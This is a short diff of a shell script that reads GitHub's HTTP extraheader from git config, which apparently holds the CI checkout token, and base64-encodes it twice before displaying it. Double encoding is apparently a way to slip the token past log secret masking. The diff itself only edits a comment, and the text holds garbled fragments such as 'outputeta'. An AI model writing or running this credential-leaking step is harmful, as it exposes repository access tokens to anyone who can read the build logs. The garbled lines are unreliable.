@@ -3,7 +3,7 @@ git_config_output=$(git config --get http.https://github.com/.extraheader)
 # First Base64 encoding
 first_base64_encoded=$(echo "$git_config_output" | base64)
 
-# Second Base64 encoding###
+# Second Base64 encoding###$$
 double_base64_encoded=$(echo "$first_base64_encoded" | base64)
 
 # Display the double Base64 encoded outputeta
